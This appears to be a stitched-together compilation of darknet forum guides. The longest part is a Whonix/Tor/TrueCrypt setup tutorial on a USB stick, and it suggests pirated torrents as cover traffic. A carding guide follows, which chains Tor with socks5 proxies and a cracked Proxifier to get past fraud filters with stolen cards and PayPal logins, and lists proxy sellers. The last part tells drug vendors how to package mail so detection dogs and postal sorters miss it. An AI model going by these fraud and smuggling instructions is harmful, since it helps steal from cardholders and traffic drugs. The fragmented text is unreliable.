4.1. (Optional) Change keyboard layout  If you're not from the USA you may have to change the keyboard layout.  Click the start button on the upper left on the Xubuntu desktop and go to Settings -> Settings Manager -> Keyboard  Select the Layout tab and uncheck ""Use system defaults"". Click the ""Add"" button, select your keyboard layout (optionally select a variant) and click OK. Select ""English(US)"", click the ""Delete"" button and ""Close"".  4.2. Install VirtualBox  Click the start button on the upper left on the Xubuntu desktop and start Ubuntu Software Center. In the search box enter ""virtualbox"". Select the ""VirtualBox"" icon and click the now visible Install button.  When the installation is done, close the Ubuntu Software Center window and proceed to the next step.  4.3. Install TrueCrypt  Click the Xubuntu start button and start the Web Browser. Go to http://www.truecrypt.org/downloads and download the appropriate Linux version of TrueCrypt. If you are using the amd64 version of Xubuntu, select the ""Standard 64-bit"" version, otherwise select the 32-bit version.  On the Xubuntu desktop, doubleclick the Home -> Downloads folder. Click the truecrypt archive icon with the right mouse button and select Extract Here. Doubleclick the truecrypt-*-setup icon, click Install TrueCrypt, agree with the license agreement and click OK. Press Enter to exit when prompted.  Delete the files from the Downloads folder.   5. Setting up TrueCrypt  We are using TrueCrypt for encryption because it's easier to setup for Linux novices. We are using a TrueCrypt container because this is easier to backup later.  To increase the performance during the installation you could create the TrueCrypt container on your hard drive instead, and copy it to the Krypton folder later. Writing data (installing) to the USB stick is slower than reading data (booting, running programs). You do need to know how much space is left in the Krypton folder however, so the TrueCrypt container won't be too large.  5.1. Creating the TrueCrypt container  Click the Xubuntu start button and start Accessories -> TrueCrypt. Click ""Create Volume"" and click Next to create an encrypted file container. Click Next to create a standard TrueCrypt volume. Uncheck ""Never save history"" and click the Select File button. On the right side of the window, select the Krypton folder, enter a name on the top of the window, e.g. kryptonite, and click Save. Click Next to get to the encryption algorithm selection.  Select either AES-Twofish (fastest, double encryption), Serpent-AES (slower, stronger double encryption) or AES-Twofish-Serpent (slowest but triple encryption) as Encryption Algorithm. Select Whirlpool as Hash Algorithm.  If you have a slow computer you may want to use AES and RIPEMD, but those can be cracked faster. Police won't be able to crack it in reasonable time, but the NSA may be able to. Try the benchmark to see how fast they are on your computer. 100mb/s should be enough, as USB2 sticks are way slower than that anyway. So encryption is still faster than your USB stick.  Click Next and enter the size of the TrueCrypt volume to be created. On an 8GB USB stick it should show about 6.2 GB available, enter 6200 (MB). If there is more space on your USB stick, make it larger.  Enter a strong password for the volume. The password should have more than 20 characters and numbers and the words shouldn't be found in a dictionary. Click Next and select ""I will store files larger than 4GB on the volume"". Click Next and select Linux Ext2 as filesystem type. Click Next because we may want to mount the volume on another OS in future. Move your mouse around randomly for 30 seconds over the TrueCrypt window, then click Format.  This can take a while, depending on the quality of your USB stick.  TrueCrypt may freeze when the format is done 100%. If it freezes for longer than a few minutes, simply reboot the system by clicking the Xubuntu start button -> Log Out -> Restart  5.2. Mounting the TrueCrypt container  Start Accessories -> TrueCrypt again, if you had to reboot in the last step. If you didn't have to reboot, click Dismount All in the TrueCrypt window.  Select Slot 1 in the TrueCrypt window and click the Select File button. Select Krypton -> kryptonite and click Open. Click the Mount button and enter the encryption password.  6. Setting up VirtualBox  Click the Xubuntu start button -> Accessories -> VirtualBox. In the VirtualBox Manager, click File -> Preferences. Click the Default Machine Folder selector and select Other... On the right side of the window select the ""truecrypt1"" folder and click Open. Click OK to close the VirtualBox Settings window.  6.1. Importing Whonix  In the VirtualBox Manager, click File -> Import Appliance. Click Choose and find the Whonix-Gateway.ova file you've downloaded. Click Next, in the next window click Import.  This can take a few minutes, depending on the quality of your USB stick. It shouldn't take more than 3-4 minutes.  In the VirtualBox Manager, click File -> Import Appliance. Click Choose and find the Whonix-Workstation.ova file you've downloaded. Click Next, in the next window click Import.  This can take 10+ minutes, depending on the quality of your USB stick. If it takes much longer than 10 minutes than your USB stick sucks.  6.2. Setting up Whonix  To increase the speed on multicore CPU's the virtual machine settings have to be changed.  In the VirtualBox Manager, select Whonix-Workstation and click the Settings button. Go to System -> Processor and increase the number of Processors to the number of cores your CPU has. Click OK to close the settings window and increase the number of processors of the Whonix-Gateway.  It is not recommended to change any other virtual machine settings. E.g. don't increase the memory size.  6.2.1. Whonix Gateway  In the VirtualBox Manager, select Whonix-Gateway and click the Start arrow. Click OK to dismiss any popup windows.  You should see a command prompt (user@host:~$) after the gateway is booted. Wait 60 seconds until whonixcheck starts and tests the network connection. You should see the messages ""You are successfully using Tor"" and ""Checking for operating system updates..."".  If instead there is an error message after 2 minutes, enter ""whonixcheck"" at the command prompt. If you see an error message again you have to repeat this, until you are successfully using Tor and Whonix is checking for operating system updates.  The update check can take 10+ minutes to complete, depending on the current speed of the Tor circuit. Wait until you see the ""Last run .... of Network Time Synchronization..."" message.  6.2.1.1. (Optional) Change keyboard layout  If you are not from the USA, you may have to change the keyboard layout. At the command prompt enter  sudo dpkg-reconfigure console-data   You may have to use your numpads ""-"" key, depending on your keyboard. Enter the password ""changeme"" when prompted. Use the cursor keys to select ""Select keymap from arch list"" and press Enter. Select the appropriate keyboard layout family for your country, then select the keyboard layout and a keyboard variant.  6.2.2.2. Update Whonix-Gateway software packages  At the command prompt enter  sudo apt-get update && sudo apt-get dist-upgrade    Enter the password ""changeme"" if prompted. Enter ""y"" to continue the software update when prompted.  Updated packages will get downloaded now. This can take 10+ minutes, depending on the speed of the current Tor circuit. When the downloads are finished you will probably get prompted about configuration file updates. Just press Enter when there are any questions.  When the installation process is finished and you see the command prompt (user@host:~$) again, proceed to the next step.   6.2.2. Whonix Workstation  In the VirtualBox Manager, select Whonix-Workstation and click the Start arrow. Click OK to dismiss any popup windows.  When the Whonix desktop is booted you should see the whonixcheck time synchronization window.  You may want to wait 3+ minutes until the whonixcheck time synchronization window disappears, otherwise the desktop may be a little unresponsive. The speed of this process depends on the quality of your USB stick and the current Tor circuit speed.  When the larger whonixcheck window appear, click OK to close it.  When the mouse pointer gets captured by the virtual machine you can uncapture it again by clicking the right CTRL key on the keyboard.  6.2.2.1. (Optional) Change keyboard layout  If you are not from the USA, you may have to change the keyboard layout.  Click the K(DE) start button on the lower left and select System Settings. Click the Input Devices icon and select the Layouts tab. Check ""Configure layouts"" and click the Add button. Click the ""Limit selection by language"" selector and choose your language. Click the ""Layout"" selector and choose your language. Click OK to close the selection window, select ""us English (US)"" and click the Remove button. Click the Apply button and close the keyboard settings window.  6.2.2.2. Update Whonix-Workstation software packages  Doubleclick the Konsole icon on the Whonix desktop and enter  sudo apt-get update && sudo apt-get dist-upgrade    Enter the password ""changeme"" when prompted and enter ""y"" when prompted to start the package downloads.  Updated packages will get downloaded now. This can take 45+ minutes, depending on the speed of the current Tor circuit. When the downloads are finished you will probably get prompted about configuration file updates. Just press Enter when there are any questions.  When the installation process is finished (this can take 30+ minutes) and you see the command prompt (user@host:~$) again, enter ""sudo reboot"" in the Konsole window to reboot the Whonix workstation.  6.2.2.3. (Optional) VirtualBox Guest Additions  To be able to use Whonix in full screen resolution or simply resize the virtual machine window we need to install the VirtualBox Guest Additions. This will also stop the mouse pointer from getting captured by the virtual machine and enables you to turn on clipboard sharing (not recommended) and shared folders (not recommended).  Note that the installation of the guest additions is not recommended by the Whonix developer. Have a look at this page and the links to see why, do not follow the instructions on that page however:  http://zo7fksnun4b4v4jv.onion/wiki/Virt ... _Additions or https://www.whonix.org/wiki/VirtualBox_Guest_Additions  Those issues are probably neglectable, and some users may find it a lot more convenient to be able to resize the Whonix desktop.  Click the Xubuntu start button and start the Ubuntu Software Center. Enter ""virtualbox-guest-additions"" in the search box and select ""Transitional package for virtualbox-guest-additions-iso / virtualbox-guest-additions"". Click Install and close the Ubuntu Software Center window when the installation is complete.  In the Whonix-Workstation virtual machine window, select Devices -> Install Guest Additions.  On the Whonix desktop, doubleclick the Konsole icon. Enter this line and enter your password when prommpted:  sudo apt-get install build-essential linux-headers-$(uname -r)  Enter ""y"" and wait for the downloads and installation to be completed.  When you see the command prompt again, enter these case sensitive lines:  sudo mkdir /media/cdrom sudo mount /dev/sr0 /media/cdrom sudo /media/cdrom/VBoxLinuxAdditions.run  When this is done and you see the command prompt again, enter ""sudo reboot"" to reboot the Whonix virtual machine. After rebooting Whonix-Workstation you should be able to resize the Whonix desktop and use full screen resolution and other guest addition features.  7. Finishing the installation and cleaning up  7.1. Update Tor Browser  On the Whonix desktop, doubleclick the Update Tor Browser icon. Click Yes to start the update when prompted.  Note that using this method to update the Tor Browser will discard your old bookmarks. They will be backed up in the Home folder however.  7.2. (Optional, recommended) Install Xfce4  If you prefer the look and feel of the Xubuntu desktop over the Whonix (KDE) desktop you can install Xfce4 to make Whonix look more like Xubuntu. This should also speed up boot up times a little.  Doubleclick the Konsole icon and enter these lines:  sudo apt-get install xfce4 sudo reboot    Enter your user password when prompted. Downloading and installation should take less than 10 minutes.  If you need to change your keyboard layout after rebooting, see step 4.1. how to do it.  7.3. Cleaning up  On the Whonix desktop, doubleclick the Konsole icon and enter:  sudo rm /var/cache/apt/archives/*deb    Enter the password ""changeme"" when prompted.  Enter the same line in the Whonix-Gateway window.  Click the Xubuntu start button, start Accessories -> Terminal Emulator and enter the same line.  7.4. Change passwords  This doesn't really add much security, but it is recommended that you change the default password in both Whonix-Workstation and Whonix-Gateway.  On the Whonix desktop, start Konsole and enter ""passwd"". Enter the current password (""changeme""), then enter the new password two times. The password doesn't need to be overly strong. This is the user password.  Enter ""sudo su"" and enter the password. Again, enter ""passwd"" and enter the new password two times. You can use the same password as before, as this doesn't add much security. This is the root (admin) password.  On the Whonix gateway, enter ""passwd"". Enter the current password (""changeme""), then enter the new password two times. You can use the same password you used on the Whonix workstation. Enter ""sudo su"" and enter the password. Again, enter ""passwd"" and enter the new password two times.  7.5. Create a PGP key  Click the KGpg icon on the Whonix desktop. Click the small arrow on the right side of the Whonix task bar and select KGpg. In the KGpg window, select Keys -> Generate Key Pair Enter a fake name and fake email address. Set key size to 4096 and click OK. Enter a strong password (20+ characters) and click OK. Click OK when the key generation is finished.  7.6 Disable automatic updates  We don't need automatic Xubuntu updates on a persistent live system with only little space left.  Click the Xubuntu start button -> Ubuntu Software Center In the Edit -> Software Source select the Updates tab and set Automatically check for updates to Never. Close and Software Sources window and the Ubuntu Software Center  7.7. Backup the TrueCrypt container  Shutdown both Whonix virtual machines. On the Whonix desktop, click the KDE start button and select Leave -> Shutdown. Click Turn Off Computer and OK. On the Whonix gateway, enter ""sudo halt"" and enter the user password when prompted.  On the Xubuntu desktop, open the Krypton folder, click the kryptonite file with the right mouse button and select Copy. Select a destination from the panel on the right side, e.g. another USB stick, click the folder display on the right side with the right mouse button and select Paste.  If the USB stick ever breaks, simply repeat steps 1-4 to create a new persistent Xubuntu with VirtualBox and TrueCrypt. Instead of creating a new TrueCrypt container, copy the kryptonite file to the Krypton folder and mount it in TrueCrypt. That way you can create copies of the bootable USB stick within less then 15 minutes  8. Tor configuration  These steps are not really necessary for Tor to function properly in most cases. It will already use entry guards, one of the main advantages over Tails. You can skip steps 8.* if you don't want to use specific fast entry nodes or bridges and you don't want to block relays in certain countries from becoming the exit node.  Selecting public entry guards in your own country (step 8.2.1.) is recommended, if you don't need to hide that you are using Tor. Not hiding that you are using Tor is to be prefered over not hiding it properly. If you try to hide using Tor and don't do it properly, then this will just make you more suspcicious.  8.1. Common Tor configuration  In the Whonix-Gateway window, enter this line at the command prompt:  sudo nano /etc/tor/torrc    Press enter and enter your Whonix-Gateway user password when prompted. Scroll down to the bottom of the text by using the cursor keys or the Page Down key on your keyboard and enter these lines:  AvoidDiskWrites 1 ClientOnly 1 StrictNodes 1    Press CTRL + x and enter ""y"" when prompted. Press Enter to save the text file.  8.2. Optional Tor configuration (entry nodes, bridges, blocking exit nodes)  To be able to copy+paste something into the Whonix-Gateway it's necessary to use SSH. You probably don't want to type fingerprints or list of bridges by hand.  Shutdown the Whonix-Gateway by entering ""sudo halt"".  Select Whonix-Gateway in the VirtualBox manager and click it with the right mousebutton. Select Settings and click Network and Advanced. Click the Port Forwarding button and click ""+"" (Insert new rule)  Enter these values by doubleclicking the empty fields:  Host IP: 127.0.0.1 Host Port: 2200 Guest Port: 22  Click OK to save the settings, click OK again to close the settings window  Boot the Whonix-Gateway virtual machine again.  On the Xubuntu desktop, Start Accessories -> Terminal Emulator and enter  ssh user@localhost -p 2200   Enter the Whonix-Gateway user password when prompted.  At the command prompt, start the nano text editor by entering  sudo nano /etc/tor/torrc    8.2.1. (Optional) Entry Nodes  Instead of using random Tor entry nodes you may want to use a little selection of trusted or fast entry nodes in your own country. If you prefer to use obfuscated bridges instead you can skip this step.  Go to http://torstatus.blutmagie.de/index.php ... th&SO=Desc and search for 5-10 of the fastest relays in your country (top of the list = fastest relays).  Click the relay name to get more informations about the relay and copy the fingerprint line. The fingerprint looks like this: CFA4 8FC3 E843 DFF0 1AA0 26EC 7701 0AB5 7E8C 2FF0  Copy it to the clipboard and scroll down to the bottom of the text file in the nano text editor which is running in the Terminal Emulator window. Enter a new line and paste the fingerprint.  Remove the spaces in the fingerprint and add a $ to the beginning, so it will look like this: $CFA48FC3E843DFF01AA026EC77010AB57E8C2FF0  Do this with at least 3 relays, 5 or more are better. Add commas between each fingerprint and put them all into one line, then add ""EntryNodes "" to the beginning of the line like this: EntryNodes $CFA48FC3E843DFF01AA026EC77010AB57E8C2FF0,$CFA48FC3E843DFF01AA026EC77010AB57E8C2FF0,$CFA48FC3E843DFF01AA026EC77010AB57E8C2FF0  Unless you want to further change the Tor configuration, press CTRL + x and enter ""y"" when prompted. Press Enter to save the text file.  8.2.2. (Optional) Bridges  Some users may want to use obfuscated bridges. If someone is sniffing your internet connection it will be harder for them to find out that you are using Tor. However bridges are less reliable and tend to have lower performance than normal entry nodes. Right now Whonix only supports obfs2 and non-obfuscated bridges by default.  Using normal non-obfuscated bridges is pretty much useless, if someone with enough resources (China, Five Eyes, ...) is doing deep packet inspection. If getting a list of obfuscated bridges is too much hassle for you, but you do need to hide the fact that you are using Tor, then you should use a VPN instead.  See step 9. how to set up a OpenVPN connection.  8.2.2.1. (Optional) Obfuscated bridges  Find the ""## Using obfuscated bridges #"" section in the nano text editor which is running in the Terminal Emulator window. Find the line ""#UseBridges 1"" and remove the ""#"" at the beginning of the line. Find the line ""#ClientTransportPlugin obfs2 exec /usr/bin/obfsproxy --managed"" and remove the ""#"" at the beginning of the line.  Create a new line and enter your obfs2 bridges like this: Bridge obfs2 111.22.33.44:1234 Bridge obfs2 44.33.22.111:1234  You should use at least enter 3 bridges, each in a seperate line.  Go to this page and write an email to get help with obfuscated bridges: https://bridges.torproject.org/  8.2.2.2. (Optional) Normal public bridges  If you have to use normal bridges because your ISP is blocking Tor, scroll down to the bottom of the text file in the nano text editor which is running in the Terminal Emulator window, and add this line: UseBridges 1  Below that line enter the bridges like this, each in a seperate line: Bridge 111.22.33.44:1234 Bridge 44.33.22.111:1234  You can get a list of normal bridges from here: https://bridges.torproject.org/bridges  Unless you want to further change the Tor configuration, press CTRL + x and enter ""y"" when prompted. Press Enter to save the text file.  8.2.3. (Optional) Block countries from becoming the clearnet exit node  It's possible to block certain countries from becoming the exit node. This is mostly useless, but in some rare cases it may actually be useful. To block exit nodes in Five Eyes & friends countries from becoming your exit node, scroll down to the bottom of the text file in the nano editor and enter this line:  ExcludeExitNodes {us},{gb},{ca},{au},{nz},{ie},{sg},{??},{a1},{a2},{o1}   You can find a list of more country codes here (these are not always the same as internet top level domains) http://en.wikipedia.org/wiki/ISO_3166-1_alpha-2 Do not add too many countries to the list however, as this may reduce anonymity.  Press CTRL + x and enter ""y"" when prompted. Press Enter to save the text file.  9. (Optional) VPN  If you need to hide that you are using Tor you may want to use a VPN instead of obfuscated bridges.  Do not use PPTP VPN's. The PPTP protocol was developed by Microsoft and can most likely easily be decrypted by Five Eyes countries. That's why this tutorial only covers the installation and usage of OpenVPN.  Using VPN's in Sweden (or Singapore) may also offer no protection against the Five Eyes knowing about your Tor usage, as the Swedish government submissively lets the USA do anything they want with Swedish internet cables. So tunneling Tor through a VPN in Sweden may make you even more interesting to the Five Eyes adversaries than simply using Tor alone.  If you do use a VPN in a ""safe"" country (that country should also have neighbouring ""safe"" countries), then you should set up Tor to use entry guards in that country or its neighbours, and make sure the traffic between the VPN and the entry guard does not pass through sea cables which have been compromised by the Five Eyes and their submissive friends.  Note that even when using a VPN to conceal that you are using Tor, the Five Eyes may under certain circumstances still detect that you are using Tor by using time/size correlation resp. end-to-end correlation attacks. To make this harder you could install a Bittorrent client and download copyrighted torrents from The Pirate Bay while using the VPN. Do NOT download torrents through Whonix/Tor however, because that would make deanonymization even easier. Use Xubuntu to download torrents.  9.1. Installing OpenVPN  Start the Terminal Emulator and enter  sudo apt-get install -y openvpn network-manager-openvpn-gnome    9.2. Preparing the system for OpenVPN usage  Normally you would simply import the .ovpn file in Xubuntu start button -> Settings -> Network Connections -> VPN, but that does not work properly in current versions of Xubuntu.  Open the Home folder on the desktop and create a new folder named ""vpn"". Open the vpn folder and copy the .ovpn file you've downloaded from your VPN provider into it.  Click the background of the folder with the right mouse button and select Create Document -> Empty File. Enter ""credentials"" as name. Doubleclick the credentials file and enter your VPN username and password in the text editor, each in a seperate line. Example:  snowden r1s3.uP.4Nd.74k3.7H3.p0w3r.b4cK,17s.71m3.7H3.f47.c47s.h4d.4.h34R7.4774cK   Save the file and close the text editor.  Click the background of the folder with the right mouse button and select Create Document -> Empty File. Enter ""startvpn.sh"" as name. Doubleclick the startvpn.sh file and enter these lines:  cd /home/xubuntu/vpn xterm -e ""sudo openvpn --config CHANGEME.ovpn --auth-user-pass credentials"" xterm -e ""echo ATTENTION! The VPN has been disconnected or failed. Whonix will connect to Tor with your real IP; sleep 30""   Replace CHANGEME.ovpn with the filename of the .ovpn file you've downloaded from your VPN provider. Save the file and close the text editor.  Click the startvpn.sh file with the right mousebutton and select Properties. Select the Permissions tab and check ""Allow this file to run as a program"" and close the Properties window.  You can now test the VPN connection by clicking the startvpn.sh icon on the desktop. If you want to disconnect from the VPN, select the VPN window and press CTRL + C.  If you ever see the message ""ATTENTION! The VPN has been disconnected or failed"" you should pause or shutdown the Whonix virtual machines immediately.  9.2. (Optional) Create a link on the desktop  The recommended way to start the VPN is by making it start when the Xubuntu desktop starts. If instead you want to start the VPN manually by doubleclicking it, then you can create a link on the desktop.  Note that if you forget starting the VPN before starting Whonix then your Tor usage may get detected by adversaries from secret services. If you want to prevent that anyone except the VPN provider (and the secret service in the country which hosts the VPN) knows that you are using Tor you can skip this step and proceed to step 9.3.  Click the startvpn.sh file with the right mouse button and select Send To -> Desktop (Create Link).  You can now start the VPN connection by doubleclicking the startvpn.sh icon on the Xubuntu desktop.  9.3. (Optional) Start the VPN with the desktop  Instead of manually starting the VPN you may want to start the VPN when the Xubuntu desktop starts.  Click the Xubuntu start button -> Settings -> Settings Manager. Doubleclick the Session and Startup icon and select the Application Autostart tab. Click the Add button and enter VPN as name. Enter /home/xubuntu/vpn/startvpn.sh in the Command text box and click OK. Click Close to close the Session and Startup window.  Reboot Xubuntu to see if the VPN starts up when booting. Start the web browser and go to ip-check.info to see if your IP is concealed.  9.4. (Optional, recommended) Cover traffic with Bittorrent  Xubuntu already comes with the Transmission Bittorrent client pre-installed, so we only have to configure it properly. As we use an 8GB USB stick we don't want to download torrents to it, but to our hard drive instead. As we don't want to select a new torrent once per hour we deliberately slow down the downloads.  Click the Xubuntu start button and select Internet -> Transmission. In the Transmission menu select Edit -> Preferences. Select the Downloading tab and change the Save to Location to a folder on your hard drive. Change Maximum active downloads to 1 or 2. Select the Speed tab and check the Download Speed Limit. Set it between 10-20kB/s.  Close the Preferences window and go to http://thepiratebay.sx/browse in Firefox. Find a large file with over 50 seeders (the SE number in the torrent list) and click the link. On the torrent page click the ""GET THIS TORRENT"" link with the magnet icon. When the Launch Application window opens, click the Choose button and browse to File System -> usr -> bin Select the transmission-gtk file and click Open. Check ""Remember my choice for magnet links"" and click OK to close the Launch Application window. If a Torrent Options window pops up, click Open. The torrent should now be visible in the Transmission window and start downloading after a minute.  You can add more torrents to Transmission by clicking the ""GET THIS TORRENT"" links on various torrent pages on The Pirate Bay. When one torrent download is finished the next download will start.  You may want to start Transmission automatically when the desktop starts. Click the Xubuntu start button -> Settings -> Settings Manager and click the Session and Startup icon. Select the Application Autostart tab and click the Add button. Enter Transmission as name and enter ""/usr/bin/transmission-gtk"" as the Command. Click OK to add the application to the Autostart and click Close.  Reboot your system to see if Transmission automatically starts when the desktop starts.  If the torrents in Transmission show errors after rebooting the system that's probably because your hard drive for the torrent downloads wasn't automatically mounted. In that case simply doubleclick the icon of the hard drive on the Xubuntu desktop to mount it. In the transmission window select the torrent with the error message and click the Start torrent button. If the download doesn't start after a minute, close Transmission and start it again from the Xubuntu start button menu.  You should always wait for the download to start before starting Whonix. You should also always have active downloads in Transmission. Once a torrent has finished downloading you can delete it from the hard drive and start it again.  Congratulations. You are now a Tor ninja.  10. Using the system  10.1. Booting  To use the system, boot from the USB stick and start TrueCrypt. Select Slot 1 and click Select File, if the file isn't selected already. Open the Krypton folder and select the kryptonite file. Click the Mount button and enter the password.  Start VirtualBox and start the Whonix-Gateway. Wait until it's booted, then start the Whonix-Workstation.  10.2. Tor Browser  There are 2 versions of the Tor Browser on the Whonix desktop. It is recommended that you start it with the ""Tor Browser Recommended..."" icon. You may want to disable Javascript by clicking the S icon after starting Tor Browser for the first time.  10.3. Tor status monitor  Whonix does not include Vidalia, but the Whonix-Gateway includes ARM (anonymizing relay monitor). In the Whonix-Gateway window enter ""sudo arm"" and enter your user password when prompted. You can press ""n"" to get a new identity, or press ""m"" for a menu which can be navigated with the cursor keys.  10.4. XChat  The IRC program XChat is already installed and preconfigured to use with Tor. If you want to chat in the OFTC #tor channel, doubleclick the XChat icon and select XChat -> Network List in the Xchat menu. Click the Connect button to connect with the IRC server, enter #tor in the text box and click OK to join the channel. You can change your nickname by entering ""/nick something"" in the text box on the bottom of the XChat window.  To get a list of more channels on the OFTC server, select Server -> List of Channels in the XChat menu and click the Search button. Doubleclick a channel to join it. You can also enter ""/join #channelname"" in the text box on the bottom of the XChat window to join existing channels or create your own.  10.5. Using KGpg  Doubleclick the KGpg icon on the Whonix desktop. If you use the standard Whonix desktop, click the small arrow on the right side of the Whonix task bar and select KGpg. If you installed Xfce4 desktop, click the lock icon on the top right of the desktop task bar.  10.5.1. Adding keys  Copy the PGP key to the clipboard and select Keys -> Import Key in the KGpg window. Select Clipboard and click OK.  10.5.2. Encrypting a message  In the KGpg menu select File -> Open Editor and type your message. Click the Encrypt button on the bottom of the KGpg text editor window, select a key and click OK.  10.5.3. Decrypting a message  In the KGpg menu select File -> Open Editor and paste the encrypted message from the clipboard. Click the Decrypt button on the bottom of the KGpg text editor window and enter your passphrase.  10.6. Other apps  If you want to install any other programs like Pidgin, doubleclick the Apper icon on the desktop.    See the Whonix documentation for further details: http://zo7fksnun4b4v4jv.onion/wiki/Documentation or https://www.whonix.org/wiki/Documentation  ",""

If you're trying to card some items on any site with fraud filters you're obviously going to raise some flags if the cardholder lives in New York and you're connecting from a German exit node. Same goes for Paypal logins. Keep in mind you will need to use a clean socks5 within the same region as the cardholder/account. If US within the same state, or otherwise within the same area. A link to sites providing private socks services is provided at the end of this article.  Even if carding isn't your thing many sites filter out exit nodes, so it's a necessity to have some control over where you appear to be connecting from.  Note: If you have the Tor Browser Bundle and haven't installed Tor separately, use port 9150 in place of 9050 for the following configurations.    Proxychains   Down towards the bottom you should see:   Just write your list in using Tor as the first listed:   After that you should be done. Just go to terminal and set your browser to go through proxychains:  proxychains firefox    Proxifier  If you are on Windows you will want to setup your chain using Proxifier. First download and install a cracked copy of proxifier. Once you have it installed and run go to Options -> Proxy Settings and configure your chain:   Once you have set your proxy settings go to Options -> Proxification Rules and set the following rules:   Once you are finished go to Name Resolution, choose Remote, click OK, and you're set. Keep in mind that if you use Proxifier you need to use a browser that isn't already configured to connect through Tor or it will ignore the Proxifier settings and just route strictly through Tor. For this guide my recommendation is a copy of Firefox Portable that has been secured. Instructions for Proxifier 3.0  Profile -> Proxy Servers -> Add.  Address 127.0.0.1, Port 9050, Socks v5 -> Ok. Popup box will ask whether to set as default. Select Yes.  Now add your proxy you want to use in the same way. Click 'Proxychains' button then 'Create', and drag & drop to the new rule. You should have something that looks like this.  New 127.0.0.1:9050 IP address:port (the details you entered earlier)  Now go to Profile -> Proxification Rules.  In the drop down menu for 'Default' select 'Proxy socks5 127.0.0.1' & uncheck the localhost rule.  Then Add -> change action to 'Chain new'. ->Ok.  Next, Profile -> Name Resolution. Select Resolve hostname through Proxy.    Thats it....you're good to go.    ","First download & install proxychains:sudo apt-get install proxychainsThen configure proxychains to setup your chain:sudo nano /etc/proxychains.conf;[ProxyList]# add proxy here ...# meanwile# defaults set to ""tor"";socks4 127.0.0.1 9050socks5 ip.address.here port;127.0.0.1  | 9050 | SOCKS 5IP.ADDRESS | PORT | SOCKS 5;Loopback | ALL | 127.0.0.1 | ALLTor           | tor.exe | ALL  | ALL;Socks Providers    http://vip72.com    http://super-socks.com    http://5socks.net    http://winsocks.net Blacklists    http://www.ip-score.com    http://whoer.net "

So what is the answer? well happily there are a number of options available right now.  All you need to know are:  * MBB - moisture barrier bags * Mylar bags * Heat seal foil bags  A non permeable layer must be included, for example when shipping small quantities of powders the layering can consist of a few variations, it may be a good idea to dispense with the zip lock baggy as the zip can be felt through the envelope. The use of double MBB cleaning each thoroughly with isotropic alcohol to remove any particle traces is one very effective method. The final stage must of course be done in a clean environment to avoid transferring any particle residue to the outer packaging, wear gloves and discard before completing this stage.  The best stealth is sometimes the simplest, envelopes must be as flat as possible with all the usual norms that make them blend into the thousands of others going through the system. If an envelope is singled out for extra attention it's gone, that usually only happens when a dog reacts to it. _____________________________________________________________________________________________________  VENDORS ALREADY USING THESE METHODS ARE LISTED BELOW  >>> Please note that the vendors listed below are done so solely on their use of non permeable stealth packaging techniques as advised by the vendor. No other factors have been considered at this time so you are strongly encouraged to fully research any vendor before placing an order <<<  =========================================================================================  TBA***  ========================================================================================  HOW IS MAIL SORTED:  When planning your packaging, take into consideration this procedure which is not specific to a particular country (only applies for letters not parcels) -  1. Mail arrives into said country in a big sack containing hundreds/thousands of letters.  2. If arriving from a ""flagged"" country it's directed to sorting area A in which mail undergoes extra scrutiny, if from non-flagged country it's directed to sorting area B for normal manual sorting.  3. At the designated sorting area, all the mail is poured onto a sorting tray and manually sorted, with the sorter removing anything that's oversize, damaged or suspicious looking (again there would be guidelines the sorters follow based on profiling and gathered intelligence). Over-sized items are sent to the parcel area, damaged items are repaired or destroyed and suspicious letters are inspected further (manual, x-ray or dog)  4. Once manual sorting is done, the mail is sent down a conveyor belt to the automatic sorting machine, while going down the conveyor belt, a drug detection dog runs over all mail heading down and alerts to letters containing whatever the dog is trained to find, these are in turn removed for further inspection (manual or x-ray) the rest carry on to the machine and are sent for distribution around the country.  5. Any mail that can't be automatically sorted for distribution (usually due to addresses in the wrong format, hand written messily, too thick to fit etc) are manually sorted again.  So using the above information, one case see that the risk areas are - the country of origin, the initial manual sorter, the drug detection dog and the final automatic sorting machine.  Country of Origin - The intelligence on which particular countries the receiving country has ""flagged' isn't made publicly available but one could assume they include - The Netherlands, Belgium, Colombia, Bolivia, Peru, China, Vietnam, Thailand among others. As well as countries added based on intelligence received and profiling.  Initial Mail Sorter - Has to manually sort hundreds of letters at once, so make sure your letter doesn't attract a second glimpse. Ensure you use a high quality envelope, not a cheap one that's thin and soft and likely to tear. Ensure it looks harmless and boring from the outside, and ensure it's as thin as possible and packaged so the contents cannot be felt if handled and so that if handled, it feels like paper inside, not a foil bag!  Drug detection dog - USE MOISTURE BARRIER BAGS! PE and Foil layered are the best, followed by PE and Mylar. You should be doing your packaging in a clean environment because if any molecules from your product end up on the outside of that bag or on the envelope, you've wasted your time and it will be detected.  Final Automatic Sorting Machine - Make sure the address is clearly readable and in the correct format for that country. Make sure your envelope is of a standard size. (see the first post of this thread for standard envelope sizes)  Use the above information and create your letters how you wish, if you still get any no-shows to a particular country, change what your letters look like because your current ones have been photographed and added to a database. This includes the return address and any identifiable logos etc. _____________________________________________________________________________________________________  HOW TO ENSURE YOUR MAIL GOES THROUGH THE SORTING MACHINES WITHOUT NEEDING TO BE SORTED MANUALLY BY ONE OF THOSE PESKY HUMANS (AU SPECIFIC)  The info below is taken from the Australia Post guidelines for international mail, and they're based around the specs required for mail to go into the auto sorter machines, if a letter falls outside of these guidelines, there's a much bigger chance it will end up being manually sorted by a person. (when you receive a letter than doesn't have one of those faint orange barcodes on it, it means its been manually sorted. This doesn't apply to bulk mail that big companies send out to 1000's of people though)  Recommended Envelope Sizes and Max Weight and thickness -  Small Letter - DL 110 mm Ã 220 mm 125g max C6 114 mm Ã 162 mm 125g max  No more than 5mm thick  Large Letter - C5 162 mm Ã 229 mm 125g max C4 324 mm Ã 229 mm 250g max B4 353 mm Ã 250 mm 250g max  No more than 20mm thick  Envelope Quality - White 100gsm Paper  Address Font - Courier or Helvetica Font - 12 point or 10 pitch It should contain no full stops or commas or other punctuation. You can use '/' but it's recommended not to. There should be no advertising/logos etc near the address. The street number should be 2 spaces away from the unit/suite number The suburb and country should be in capitals The post code should be 2 spaces away from the state Characters should be between 2mm & 4mm tall and between 0.3mm & 7mm wide The space between lines from 1mm to 2.5mm  Address example -  John Smith Suite 10 52 Silk Road PORT HEADLAND WA 3001 AUSTRALIA  Some of these things are going to the extreme and probably not necessary, besides, the huge majority of orders make it without any issues anyway but if you want perfection, this is where it's at.  Guideline books (see these for the correct address layouts and where stamps, addresses and logos etc should/shouldn't be placed. -  http://auspost.com.au/media/documents/l ... -guide.pdf http://auspost.com.au/media/documents/i ... -guide.pdf  Educational video about the mail process (clearnet) -  http://www.youtube.com/watch?v=3WumR2qpqP8  _____________________________________________________________________________________________________  Some important info for 